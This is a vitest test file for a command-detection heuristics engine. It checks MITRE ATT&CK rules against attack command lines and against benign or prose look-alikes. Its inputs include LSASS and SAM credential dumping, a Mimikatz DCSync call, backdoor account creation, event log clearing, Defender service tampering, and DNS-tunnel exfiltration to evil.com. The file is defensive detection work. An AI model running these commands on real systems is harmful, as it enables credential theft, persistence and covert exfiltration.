import { beforeAll, describe, expect, it } from "vitest";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const matchCommand = createMatcher("command");

describe("MITRE ATT&CK threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- Credential Access ---

	it("detects LSASS dump (MITRE-001)", () => {
		expect(matchCommand(engine, "rundll32.exe comsvcs.dll,MiniDump 624 lsass.dmp full")).toContain(
			"CLT-MITRE-001",
		);
	});

	it("does not match a prose mention of the LSASS dump command (MITRE-001 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "rundll32.exe comsvcs.dll MiniDump lsass is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-001")).toEqual([]);
	});

	it("detects SAM registry save (MITRE-002)", () => {
		expect(matchCommand(engine, "reg save HKLM\\sam sam")).toContain("CLT-MITRE-002");
	});

	it("detects reg.exe SAM registry save (MITRE-002)", () => {
		// {{NOT_FILENAME}} rejects a trailing dot, so an optional `.exe` suffix
		// must be admitted ahead of it for the real invocation to still match.
		expect(matchCommand(engine, "reg.exe save HKLM\\sam sam")).toContain("CLT-MITRE-002");
	});

	it("does not match SAM rule on normal reg query (MITRE-002)", () => {
		const ids = matchCommand(engine, "reg query HKLM\\SOFTWARE");
		expect(ids.filter((id) => id === "CLT-MITRE-002")).toEqual([]);
	});

	it("does not match a prose mention of the SAM registry save command (MITRE-002 FP)", () => {
		const ids = matchCommand(engine, 'echo "reg save HKLM sam is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-002")).toEqual([]);
	});

	it("detects NTDS dumping (MITRE-003)", () => {
		expect(matchCommand(engine, 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp"')).toContain(
			"CLT-MITRE-003",
		);
	});

	it("does not match a prose mention of ntdsutil (MITRE-003 FP)", () => {
		const ids = matchCommand(engine, 'echo "ntdsutil is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-003")).toEqual([]);
	});

	it("detects LSA Secrets access (MITRE-004)", () => {
		expect(matchCommand(engine, "Get-LSASecret.ps1")).toContain("CLT-MITRE-004");
	});

	it("does not match a prose mention of Get-LSASecret.ps1 (MITRE-004 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-LSASecret.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-004")).toEqual([]);
	});

	it("detects cached credentials listing (MITRE-005)", () => {
		expect(matchCommand(engine, "cmdkey /list")).toContain("CLT-MITRE-005");
	});

	it("does not match a prose mention of cmdkey /list (MITRE-005 FP)", () => {
		const ids = matchCommand(engine, 'echo "cmdkey /list is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-005")).toEqual([]);
	});

	it("detects DCSync attack (MITRE-006)", () => {
		expect(
			matchCommand(engine, 'Invoke-Mimikatz -Command "lsadump::dcsync /user:admin"'),
		).toContain("CLT-MITRE-006");
	});

	it("does not match a prose mention of the DCSync command (MITRE-006 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Invoke-Mimikatz lsadump dcsync is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-006")).toEqual([]);
	});

	it("detects credential dump via reg save (MITRE-007)", () => {
		expect(matchCommand(engine, "reg save HKLM\\SAM c:\\temp\\sam")).toContain("CLT-MITRE-007");
	});

	it("does not match a prose mention of reg save SAM (MITRE-007 FP)", () => {
		const ids = matchCommand(engine, 'echo "reg save SAM is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-007")).toEqual([]);
	});

	it("detects credential stuffing (MITRE-042)", () => {
		expect(matchCommand(engine, "Invoke-CredentialInjection.ps1")).toContain("CLT-MITRE-042");
	});

	it("does not match a prose mention of Invoke-CredentialInjection.ps1 (MITRE-042 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Invoke-CredentialInjection.ps1 is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-042")).toEqual([]);
	});

	it("detects credentials in registry (MITRE-083)", () => {
		expect(matchCommand(engine, "reg query HKLM /f password /t REG_SZ /s")).toContain(
			"CLT-MITRE-083",
		);
	});

	it("does not match credentials in registry on normal reg query (MITRE-083)", () => {
		const ids = matchCommand(engine, "reg query HKLM\\SOFTWARE /v Version");
		expect(ids.filter((id) => id === "CLT-MITRE-083")).toEqual([]);
	});

	it("does not match a prose mention of the registry credentials query (MITRE-083 FP)", () => {
		const ids = matchCommand(engine, 'echo "reg query HKLM /f password is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-083")).toEqual([]);
	});

	it("detects browser credential dumping (MITRE-086)", () => {
		expect(matchCommand(engine, "Get-ChromeDump.ps1")).toContain("CLT-MITRE-086");
	});

	it("does not match a prose mention of Get-ChromeDump.ps1 (MITRE-086 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-ChromeDump.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-086")).toEqual([]);
	});

	it("detects password store access (MITRE-087)", () => {
		expect(matchCommand(engine, "Get-VaultCredential.ps1")).toContain("CLT-MITRE-087");
	});

	it("does not match a prose mention of Get-VaultCredential.ps1 (MITRE-087 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-VaultCredential.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-087")).toEqual([]);
	});

	it("detects Golden Ticket attack (MITRE-088)", () => {
		expect(matchCommand(engine, "Invoke-Mimikatz Golden Ticket")).toContain("CLT-MITRE-088");
	});

	it("does not match Golden Ticket on normal domain query (MITRE-088)", () => {
		const ids = matchCommand(engine, 'net group "Domain Users" /domain');
		expect(ids.filter((id) => id === "CLT-MITRE-088")).toEqual([]);
	});

	it("does not match a prose mention of the Golden Ticket command (MITRE-088 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-Mimikatz Golden Ticket is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-088")).toEqual([]);
	});

	it("detects Silver Ticket attack (MITRE-089)", () => {
		expect(matchCommand(engine, "Invoke-Mimikatz Silver Ticket")).toContain("CLT-MITRE-089");
	});

	it("does not match a prose mention of the Silver Ticket command (MITRE-089 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-Mimikatz Silver Ticket is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-089")).toEqual([]);
	});

	it("detects Kerberoasting (MITRE-090)", () => {
		expect(matchCommand(engine, "Invoke-Kerberoast")).toContain("CLT-MITRE-090");
	});

	it("does not match a prose mention of Invoke-Kerberoast (MITRE-090 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-Kerberoast is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-090")).toEqual([]);
	});

	it("detects AS-REP Roasting (MITRE-091)", () => {
		expect(matchCommand(engine, "Get-ASREPHash")).toContain("CLT-MITRE-091");
	});

	it("does not match a prose mention of Get-ASREPHash (MITRE-091 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-ASREPHash is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-091")).toEqual([]);
	});

	it("detects network sniffing setup (MITRE-020)", () => {
		expect(matchCommand(engine, "netsh start trace")).toContain("CLT-MITRE-020");
	});

	it("does not match a prose mention of netsh start trace (MITRE-020 FP)", () => {
		const ids = matchCommand(engine, 'echo "netsh start trace is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-020")).toEqual([]);
	});

	// --- Discovery ---

	it("detects network scanning (MITRE-022)", () => {
		expect(matchCommand(engine, "nmap -sV 192.168.1.0/24")).toContain("CLT-MITRE-022");
	});

	it("does not match nmap substring inside identifiers (MITRE-022 FP)", () => {
		// Reproduces user-reported FP: `nmap` matched inside Win32 identifier
		// `UnmapViewOfFile` from pydevd. With \b boundaries on telnet/nmap,
		// only standalone tokens trigger the rule.
		const ids = matchCommand(engine, "UnmapViewOfFile(view)");
		expect(ids.filter((id) => id === "CLT-MITRE-022")).toEqual([]);
	});

	it("does not match telnet substring inside identifiers (MITRE-022 FP)", () => {
		const ids = matchCommand(engine, "do_telnetting()");
		expect(ids.filter((id) => id === "CLT-MITRE-022")).toEqual([]);
	});

	it("does not match a prose mention of nmap (MITRE-022 FP)", () => {
		const ids = matchCommand(engine, 'echo "nmap -sV is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-022")).toEqual([]);
	});

	it("detects permission group discovery (MITRE-032)", () => {
		expect(matchCommand(engine, "Get-ManagementRoleAssignment")).toContain("CLT-MITRE-032");
	});

	it("does not match a prose mention of Get-ManagementRoleAssignment (MITRE-032 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-ManagementRoleAssignment is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-032")).toEqual([]);
	});

	it("detects domain account discovery (MITRE-037)", () => {
		expect(matchCommand(engine, "net user admin /dom")).toContain("CLT-MITRE-037");
	});

	it("detects net1.exe domain account discovery (MITRE-037)", () => {
		// {{NOT_FILENAME}} rejects a trailing dot, so an optional `.exe` suffix
		// must be admitted ahead of it for the real invocation to still match.
		expect(matchCommand(engine, "net1.exe user admin /dom")).toContain("CLT-MITRE-037");
	});

	it("does not match domain account rule on local net user (MITRE-037)", () => {
		const ids = matchCommand(engine, "net user");
		expect(ids.filter((id) => id === "CLT-MITRE-037")).toEqual([]);
	});

	it("does not match a prose mention of the domain account discovery command (MITRE-037 FP)", () => {
		const ids = matchCommand(engine, 'echo "net user admin /dom is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-037")).toEqual([]);
	});

	it("detects email account discovery (MITRE-038)", () => {
		expect(matchCommand(engine, "Get-GlobalAddressList")).toContain("CLT-MITRE-038");
	});

	it("does not match a prose mention of Get-GlobalAddressList (MITRE-038 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-GlobalAddressList is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-038")).toEqual([]);
	});

	it("detects peripheral discovery (MITRE-043)", () => {
		expect(matchCommand(engine, "Get-WMIObject Win32_PnPEntity")).toContain("CLT-MITRE-043");
	});

	it("does not match a prose mention of Get-WMIObject Win32_PnPEntity (MITRE-043 FP)", () => {
		const ids = matchCommand(engine, 'echo "Get-WMIObject Win32_PnPEntity is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-043")).toEqual([]);
	});

	it("detects password policy discovery (MITRE-050)", () => {
		expect(matchCommand(engine, "net accounts")).toContain("CLT-MITRE-050");
	});

	it("detects net.exe accounts (MITRE-050)", () => {
		// {{NOT_FILENAME}} rejects a trailing dot, so an optional `.exe` suffix
		// must be admitted ahead of it for the real invocation to still match.
		expect(matchCommand(engine, "net.exe accounts")).toContain("CLT-MITRE-050");
	});

	it("does not match a prose mention of net accounts (MITRE-050 FP)", () => {
		const ids = matchCommand(engine, 'echo "net accounts is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-050")).toEqual([]);
	});

	it("detects domain trust discovery (MITRE-066)", () => {
		expect(matchCommand(engine, "nltest /domain_trusts")).toContain("CLT-MITRE-066");
	});

	it("does not match domain trust rule on nltest sc_query (MITRE-066)", () => {
		const ids = matchCommand(engine, "nltest /sc_query:DOMAIN");
		expect(ids.filter((id) => id === "CLT-MITRE-066")).toEqual([]);
	});

	it("does not match a prose mention of nltest /domain_trusts (MITRE-066 FP)", () => {
		const ids = matchCommand(engine, 'echo "nltest /domain_trusts is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-066")).toEqual([]);
	});

	it("detects security software discovery (MITRE-071)", () => {
		expect(matchCommand(engine, "tasklist /v | findstr virus")).toContain("CLT-MITRE-071");
	});

	it("does not match security software rule on plain tasklist (MITRE-071)", () => {
		const ids = matchCommand(engine, "tasklist /v");
		expect(ids.filter((id) => id === "CLT-MITRE-071")).toEqual([]);
	});

	it("does not match a prose mention of tasklist virus (MITRE-071 FP)", () => {
		const ids = matchCommand(engine, 'echo "tasklist virus is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-071")).toEqual([]);
	});

	it("detects software discovery (MITRE-072)", () => {
		expect(matchCommand(engine, "wmic product get name")).toContain("CLT-MITRE-072");
	});

	it("does not match software discovery on wmic os (MITRE-072)", () => {
		const ids = matchCommand(engine, "wmic os get caption");
		expect(ids.filter((id) => id === "CLT-MITRE-072")).toEqual([]);
	});

	it("does not match a prose mention of wmic product get name (MITRE-072 FP)", () => {
		const ids = matchCommand(engine, 'echo "wmic product get name is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-072")).toEqual([]);
	});

	it("detects AV reconnaissance (MITRE-104)", () => {
		expect(matchCommand(engine, "powershell -Class AntiVirusProduct")).toContain("CLT-MITRE-104");
	});

	it("does not match AV recon on normal WMI class (MITRE-104)", () => {
		const ids = matchCommand(engine, "powershell -Class Win32_OperatingSystem");
		expect(ids.filter((id) => id === "CLT-MITRE-104")).toEqual([]);
	});

	it("does not match a prose mention of the AV recon command (MITRE-104 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "powershell -Class AntiVirusProduct is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-104")).toEqual([]);
	});

	it("detects client config discovery (MITRE-105)", () => {
		expect(matchCommand(engine, "powershell Get-SmbShare")).toContain("CLT-MITRE-105");
	});

	it("does not match a prose mention of powershell Get-SmbShare (MITRE-105 FP)", () => {
		const ids = matchCommand(engine, 'echo "powershell Get-SmbShare is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-105")).toEqual([]);
	});

	// --- Persistence ---

	it("detects scheduled task creation (MITRE-026)", () => {
		expect(matchCommand(engine, "schtasks /create /tn evil /tr cmd.exe /sc daily")).toContain(
			"CLT-MITRE-026",
		);
	});

	it("detects standalone at.exe invocation (MITRE-026)", () => {
		expect(matchCommand(engine, "at.exe 12:00 cmd /c notepad.exe")).toContain("CLT-MITRE-026");
	});

	it("does not match at.exe substring inside identifiers (MITRE-026 FP)", () => {
		// Reproduces user-reported FP: `at.exe` matched inside Python
		// identifier `compat.exec(...)` from pydevd's winappdbg. With \b
		// boundaries on at.exe, only standalone tokens trigger the rule.
		const ids = matchCommand(engine, "compat.exec(_arg, globals(), locals())");
		expect(ids.filter((id) => id === "CLT-MITRE-026")).toEqual([]);
	});

	it("does not match scheduled task query (MITRE-026)", () => {
		const ids = matchCommand(engine, "schtasks /query");
		expect(ids.filter((id) => id === "CLT-MITRE-026")).toEqual([]);
	});

	it("does not match a prose mention of schtasks /create (MITRE-026 FP)", () => {
		const ids = matchCommand(engine, 'echo "schtasks /create is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-026")).toEqual([]);
	});

	it("detects Exchange manipulation (MITRE-039)", () => {
		expect(matchCommand(engine, "Add-MailboxPermission -User attacker")).toContain("CLT-MITRE-039");
	});

	it("does not match a prose mention of Add-MailboxPermission (MITRE-039 FP)", () => {
		const ids = matchCommand(engine, 'echo "Add-MailboxPermission is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-039")).toEqual([]);
	});

	it("detects account manipulation (MITRE-040)", () => {
		expect(matchCommand(engine, "net user hacker P@ss /add")).toContain("CLT-MITRE-040");
	});

	it("detects net1.exe account manipulation (MITRE-040)", () => {
		// net(?:1)?(?:\.exe)? admits net, net1, net.exe, and net1.exe
		// independently -- a prior (?:1|\.exe)? alternation only admitted one
		// suffix or the other, so net1.exe (the real binary net1 aliases to
		// on Windows) silently stopped matching.
		expect(matchCommand(engine, "net1.exe user hacker P@ss /add")).toContain("CLT-MITRE-040");
	});

	it("does not match account manipulation on net user without /add (MITRE-040)", () => {
		const ids = matchCommand(engine, "net user admin");
		expect(ids.filter((id) => id === "CLT-MITRE-040")).toEqual([]);
	});

	it("does not match a prose mention of the account manipulation command (MITRE-040 FP)", () => {
		const ids = matchCommand(engine, 'echo "net user hacker /add is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-040")).toEqual([]);
	});

	it("detects local account creation (MITRE-048)", () => {
		expect(matchCommand(engine, "net user backdoor Pass123 /add")).toContain("CLT-MITRE-048");
	});

	it("does not match a prose mention of the local account creation command (MITRE-048 FP)", () => {
		const ids = matchCommand(engine, 'echo "net user backdoor /add is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-048")).toEqual([]);
	});

	it("detects domain account creation (MITRE-049)", () => {
		expect(matchCommand(engine, "net user newadmin Pass123 /add /domain")).toContain(
			"CLT-MITRE-049",
		);
	});

	it("does not match a prose mention of the domain account creation command (MITRE-049 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "net user newadmin /add /domain is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-049")).toEqual([]);
	});

	it("detects GPO modification (MITRE-067)", () => {
		expect(matchCommand(engine, "New-GPOImmediateTask -TaskName evil")).toContain("CLT-MITRE-067");
	});

	it("does not match a prose mention of New-GPOImmediateTask (MITRE-067 FP)", () => {
		const ids = matchCommand(engine, 'echo "New-GPOImmediateTask is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-067")).toEqual([]);
	});

	it("detects file association hijacking (MITRE-075)", () => {
		expect(matchCommand(engine, "cmd /c assoc .txt=evilhandler")).toContain("CLT-MITRE-075");
	});

	it("does not match file association rule on cmd /c dir (MITRE-075)", () => {
		const ids = matchCommand(engine, "cmd /c dir");
		expect(ids.filter((id) => id === "CLT-MITRE-075")).toEqual([]);
	});

	it("does not match a prose mention of cmd /c assoc (MITRE-075 FP)", () => {
		const ids = matchCommand(engine, 'echo "cmd /c assoc is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-075")).toEqual([]);
	});

	it("detects WMI event subscription (MITRE-076)", () => {
		expect(matchCommand(engine, "scrcons.exe")).toContain("CLT-MITRE-076");
	});

	it("does not match a prose mention of scrcons.exe (MITRE-076 FP)", () => {
		const ids = matchCommand(engine, 'echo "scrcons.exe is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-076")).toEqual([]);
	});

	it("detects boot autostart persistence (MITRE-081)", () => {
		expect(matchCommand(engine, "Add-Persistence.ps1")).toContain("CLT-MITRE-081");
	});

	it("does not match a prose mention of Add-Persistence.ps1 (MITRE-081 FP)", () => {
		const ids = matchCommand(engine, 'echo "Add-Persistence.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-081")).toEqual([]);
	});

	// --- Defense Evasion ---

	it("detects steganography (MITRE-016)", () => {
		expect(matchCommand(engine, "Invoke-PSImage -Script payload.ps1")).toContain("CLT-MITRE-016");
	});

	it("does not match a prose mention of Invoke-PSImage -Script (MITRE-016 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-PSImage -Script is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-016")).toEqual([]);
	});

	it("detects indicator removal (MITRE-017)", () => {
		expect(matchCommand(engine, "Find-AVSignature -Startbyte 0")).toContain("CLT-MITRE-017");
	});

	it("does not match a prose mention of Find-AVSignature -Startbyte (MITRE-017 FP)", () => {
		const ids = matchCommand(engine, 'echo "Find-AVSignature -Startbyte is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-017")).toEqual([]);
	});

	it("detects DLL injection (MITRE-027)", () => {
		expect(matchCommand(engine, "Invoke-DllInjection.ps1")).toContain("CLT-MITRE-027");
	});

	it("does not match a prose mention of Invoke-DllInjection.ps1 (MITRE-027 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-DllInjection.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-027")).toEqual([]);
	});

	it("detects evidence file deletion (MITRE-033)", () => {
		expect(matchCommand(engine, "cmd /c del /s /q c:\\evidence")).toContain("CLT-MITRE-033");
	});

	it("does not match file deletion rule on cmd /c echo (MITRE-033)", () => {
		const ids = matchCommand(engine, "cmd /c echo hello");
		expect(ids.filter((id) => id === "CLT-MITRE-033")).toEqual([]);
	});

	it("does not match a prose mention of cmd /c del /s (MITRE-033 FP)", () => {
		const ids = matchCommand(engine, 'echo "cmd /c del /s is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-033")).toEqual([]);
	});

	it("detects share removal (MITRE-034)", () => {
		expect(matchCommand(engine, "net use \\\\server\\share /delete")).toContain("CLT-MITRE-034");
	});

	it("does not match share removal on net use without /delete (MITRE-034)", () => {
		const ids = matchCommand(engine, "net use \\\\server\\share");
		expect(ids.filter((id) => id === "CLT-MITRE-034")).toEqual([]);
	});

	it("does not match a prose mention of the share removal command (MITRE-034 FP)", () => {
		const ids = matchCommand(engine, 'echo "net use share /delete is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-034")).toEqual([]);
	});

	it("detects indirect command execution (MITRE-051)", () => {
		expect(matchCommand(engine, "rundll32.exe shell32.dll,ShellExec_RunDLL notepad.exe")).toContain(
			"CLT-MITRE-051",
		);
	});

	it("does not match indirect exec on LockWorkStation (MITRE-051)", () => {
		const ids = matchCommand(engine, "rundll32.exe user32.dll,LockWorkStation");
		expect(ids.filter((id) => id === "CLT-MITRE-051")).toEqual([]);
	});

	it("does not match a prose mention of the indirect command execution command (MITRE-051 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "rundll32.exe shell32.dll ShellExec_RunDLL is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-051")).toEqual([]);
	});

	it("detects caret obfuscation (MITRE-052)", () => {
		expect(matchCommand(engine, "p^o^w^e^r^s^h^e^l^l")).toContain("CLT-MITRE-052");
	});

	it("does not match a prose mention of the caret-obfuscated command (MITRE-052 FP)", () => {
		const ids = matchCommand(engine, 'echo "p^o^w^e^r^s^h^e^l^l is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-052")).toEqual([]);
	});

	it("detects PubPrn abuse (MITRE-053)", () => {
		expect(matchCommand(engine, "pubprn.vbs")).toContain("CLT-MITRE-053");
	});

	it("does not match a prose mention of pubprn.vbs (MITRE-053 FP)", () => {
		const ids = matchCommand(engine, 'echo "pubprn.vbs is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-053")).toEqual([]);
	});

	it("detects Verclsid abuse (MITRE-064)", () => {
		expect(
			matchCommand(engine, "verclsid.exe /S /C {00000001-0000-0000-0000-000000000000}"),
		).toContain("CLT-MITRE-064");
	});

	it("does not match a prose mention of verclsid.exe /S /C (MITRE-064 FP)", () => {
		const ids = matchCommand(engine, 'echo "verclsid.exe /S /C is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-064")).toEqual([]);
	});

	it("detects XSL script processing (MITRE-065)", () => {
		expect(matchCommand(engine, "wmic process list /FORMAT:evil.xsl")).toContain("CLT-MITRE-065");
	});

	it("detects wmic.exe XSL script processing (MITRE-065)", () => {
		// {{NOT_FILENAME}} rejects a trailing dot, so an optional `.exe` suffix
		// must be admitted ahead of it for the real invocation to still match.
		expect(matchCommand(engine, "wmic.exe process list /FORMAT:evil.xsl")).toContain(
			"CLT-MITRE-065",
		);
	});

	it("does not match XSL rule on wmic without FORMAT .xsl (MITRE-065)", () => {
		const ids = matchCommand(engine, "wmic process list brief");
		expect(ids.filter((id) => id === "CLT-MITRE-065")).toEqual([]);
	});

	it("does not match a prose mention of the XSL processing command (MITRE-065 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "wmic process list /FORMAT:evil.xsl is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-065")).toEqual([]);
	});

	it("detects UAC bypass (MITRE-082)", () => {
		expect(matchCommand(engine, "Invoke-BypassUAC.ps1")).toContain("CLT-MITRE-082");
	});

	it("does not match a prose mention of Invoke-BypassUAC.ps1 (MITRE-082 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-BypassUAC.ps1 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-082")).toEqual([]);
	});

	it("detects root certificate installation (MITRE-085)", () => {
		expect(matchCommand(engine, "certutil -addstore root evil.cer")).toContain("CLT-MITRE-085");
	});

	it("does not match root cert rule on certutil verify (MITRE-085)", () => {
		const ids = matchCommand(engine, "certutil -verify cert.pem");
		expect(ids.filter((id) => id === "CLT-MITRE-085")).toEqual([]);
	});

	it("does not match a prose mention of certutil -addstore (MITRE-085 FP)", () => {
		const ids = matchCommand(engine, 'echo "certutil -addstore is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-085")).toEqual([]);
	});

	it("detects audit policy disable (MITRE-093)", () => {
		expect(matchCommand(engine, "AUDITPOL /set /category:Detailed Tracking")).toContain(
			"CLT-MITRE-093",
		);
	});

	it("does not match a prose mention of the audit policy disable command (MITRE-093 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "AUDITPOL /set /category:Detailed Tracking is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-093")).toEqual([]);
	});

	it("detects history logging disable (MITRE-094)", () => {
		expect(matchCommand(engine, "Set-PSReadlineOption -HistorySaveStyle SaveNothing")).toContain(
			"CLT-MITRE-094",
		);
	});

	it("does not match a prose mention of the history logging disable command (MITRE-094 FP)", () => {
		const ids = matchCommand(
			engine,
			'echo "Set-PSReadlineOption SaveNothing is a classic technique"',
		);
		expect(ids.filter((id) => id === "CLT-MITRE-094")).toEqual([]);
	});

	it("detects indicator blocking via log clear (MITRE-095)", () => {
		expect(matchCommand(engine, "wevtutil cl Security")).toContain("CLT-MITRE-095");
	});

	it("does not match indicator blocking on wevtutil query (MITRE-095)", () => {
		const ids = matchCommand(engine, "wevtutil qe System");
		expect(ids.filter((id) => id === "CLT-MITRE-095")).toEqual([]);
	});

	it("does not match a prose mention of wevtutil cl Security (MITRE-095 FP)", () => {
		const ids = matchCommand(engine, 'echo "wevtutil cl Security is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-095")).toEqual([]);
	});

	// --- Exfiltration ---

	it("detects automated exfiltration (MITRE-012)", () => {
		expect(matchCommand(engine, "rar a -dw archive.rar secret/")).toContain("CLT-MITRE-012");
	});

	it("does not match exfiltration on rar extract (MITRE-012)", () => {
		const ids = matchCommand(engine, "rar x archive.rar");
		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
	});

	it("does not match pytest --tb flag in test commands (MITRE-012 FP)", () => {
		const ids = matchCommand(
			engine,
			"cd /c/Users/User/projects/test && poetry run pytest tests/test_library.py --tb=short 2>&1",
		);
		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
	});

	it("does not match a prose mention of the automated exfiltration command (MITRE-012 FP)", () => {
		const ids = matchCommand(engine, 'echo "rar a -dw archive.rar is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-012")).toEqual([]);
	});

	it("detects alternative protocol exfiltration (MITRE-023)", () => {
		expect(matchCommand(engine, "dnscat2 --secret=abc evil.com")).toContain("CLT-MITRE-023");
	});

	it("detects dnscat2.exe alternative protocol exfiltration (MITRE-023)", () => {
		// {{NOT_FILENAME}} rejects a trailing dot, so an optional `.exe` suffix
		// must be admitted ahead of it -- dnscat2's client is commonly
		// compiled to a real Windows binary in the wild.
		expect(matchCommand(engine, "dnscat2.exe --secret=abc evil.com")).toContain("CLT-MITRE-023");
	});

	it("detects iodine tunneling (MITRE-023)", () => {
		expect(matchCommand(engine, "iodine -f evil.com")).toContain("CLT-MITRE-023");
	});

	it("detects iodine.exe alternative protocol exfiltration (MITRE-023)", () => {
		// iodine ships official Windows .exe builds.
		expect(matchCommand(engine, "iodine.exe -f evil.com")).toContain("CLT-MITRE-023");
	});

	it("does not match a prose mention of dnscat2 (MITRE-023 FP)", () => {
		const ids = matchCommand(engine, 'echo "dnscat2 is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-023")).toEqual([]);
	});

	it("detects code repo exfiltration (MITRE-099)", () => {
		expect(matchCommand(engine, "Invoke-ExfilDataToGitHub")).toContain("CLT-MITRE-099");
	});

	it("does not match a prose mention of Invoke-ExfilDataToGitHub (MITRE-099 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-ExfilDataToGitHub is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-099")).toEqual([]);
	});

	it("detects cloud storage exfiltration (MITRE-100)", () => {
		expect(matchCommand(engine, "Invoke-DropboxUpload")).toContain("CLT-MITRE-100");
	});

	it("does not match a prose mention of Invoke-DropboxUpload (MITRE-100 FP)", () => {
		const ids = matchCommand(engine, 'echo "Invoke-DropboxUpload is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-100")).toEqual([]);
	});

	// --- Execution ---

	it("detects netsh helper DLL (MITRE-077)", () => {
		expect(matchCommand(engine, "netsh.exe add helper evil.dll")).toContain("CLT-MITRE-077");
	});

	it("does not match netsh helper on netsh interface (MITRE-077)", () => {
		const ids = matchCommand(engine, "netsh interface show");
		expect(ids.filter((id) => id === "CLT-MITRE-077")).toEqual([]);
	});

	it("does not match a prose mention of netsh.exe add helper (MITRE-077 FP)", () => {
		const ids = matchCommand(engine, 'echo "netsh.exe add helper is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-077")).toEqual([]);
	});

	it("detects system service manipulation (MITRE-102)", () => {
		expect(matchCommand(engine, "sc sdset WinDefend D:")).toContain("CLT-MITRE-102");
	});

	it("does not match system service on sc query (MITRE-102)", () => {
		const ids = matchCommand(engine, "sc query WinDefend");
		expect(ids.filter((id) => id === "CLT-MITRE-102")).toEqual([]);
	});

	it("does not match a prose mention of sc sdset WinDefend (MITRE-102 FP)", () => {
		const ids = matchCommand(engine, 'echo "sc sdset WinDefend is a classic technique"');
		expect(ids.filter((id) => id === "CLT-MITRE-102")).toEqual([]);
	});

	// --- Lateral Movement ---

	it("detects DCOM lateral movement (MITRE-014)", () => {
